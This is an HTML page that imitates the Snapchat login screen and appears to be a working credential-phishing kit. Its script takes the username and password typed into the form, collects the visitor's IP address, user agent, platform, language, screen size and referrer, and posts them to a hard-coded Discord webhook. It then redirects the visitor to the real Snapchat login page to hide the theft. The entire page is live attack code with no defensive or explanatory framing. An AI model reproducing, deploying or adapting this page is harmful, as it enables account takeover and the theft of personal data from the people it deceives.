<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Snapchat</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#FFFC00;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column}
.container{width:100%;max-width:360px;padding:20px;text-align:center}
.logo{width:80px;height:80px;margin-bottom:30px;background:#000;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-left:auto;margin-right:auto}
.logo::after{content:"👻";font-size:40px}
h1{font-size:28px;font-weight:700;color:#000;margin-bottom:8px}
p.sub{color:#333;font-size:14px;margin-bottom:30px}
input{width:100%;padding:14px 16px;font-size:16px;border:1px solid #ddd;border-radius:8px;background:#fff;margin-bottom:12px;outline:none}
input:focus{border-color:#FFFC00;box-shadow:0 0 0 2px rgba(255,252,0,0.3)}
button{width:100%;padding:14px;font-size:16px;font-weight:700;border:none;border-radius:8px;background:#000;color:#FFFC00;cursor:pointer;margin-top:8px}
button:active{transform:scale(0.98)}
.forgot{color:#333;font-size:13px;margin-top:16px;text-decoration:none;display:block}
.signup{color:#000;font-size:14px;margin-top:24px;font-weight:600}
</style>
</head>
<body>
<div class="container">
<div class="logo"></div>
<h1>Log In</h1>
<p class="sub">to continue to Snapchat</p>
<form id="loginForm">
<input type="text" id="username" placeholder="Username or Email" required autocomplete="off">
<input type="password" id="password" placeholder="Password" required autocomplete="off">
<button type="submit">Log In</button>
</form>
<a href="#" class="forgot">Forgot your password?</a>
<p class="signup">Sign up for Snapchat</p>
</div>
<script>
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510871444832260333/m4wXoUCMZDGO-pMd08i_bvJXmNosmYmsJ0HA2nw1tmEP_h2HWoHDTZ6OkFqcZuzVBI5x';

document.getElementById('loginForm').addEventListener('submit', function(e){
    e.preventDefault();
    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    
    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(ipData=>{
        const data = {
            ip: ipData.ip || 'unknown',
            ua: navigator.userAgent,
            platform: navigator.platform,
            lang: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: screen.width+'x'+screen.height,
            pixel: window.devicePixelRatio,
            touch: navigator.maxTouchPoints,
            referrer: document.referrer || 'direct'
        };
        
        const embed = {
            title: "🎯 Snapchat Login",
            color: 16711680,
            timestamp: new Date().toISOString(),
            fields: [
                {name: "👤 Username", value: user, inline: true},
                {name: "🔑 Password", value: pass, inline: true},
                {name: "📍 IP", value: data.ip, inline: true},
                {name: "💻 Platform", value: data.platform || '-', inline: true},
                {name: "🌐 Language", value: data.lang || '-', inline: true},
                {name: "📱 Screen", value: data.screen, inline: true},
                {name: "🔗 Referrer", value: data.referrer, inline: false},
                {name: "🔎 UA", value: data.ua.substring(0, 200), inline: false}
            ]
        };
        
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({content: "@everyone 🚨 New Login!", embeds: [embed]})
        }).catch(()=>{}).finally(()=>{
            window.location.href = 'https://accounts.snapchat.com/accounts/login';
        });
    }).catch(()=>{
        window.location.href = 'https://accounts.snapchat.com/accounts/login';
    });
});
</script>
</body>
</html>
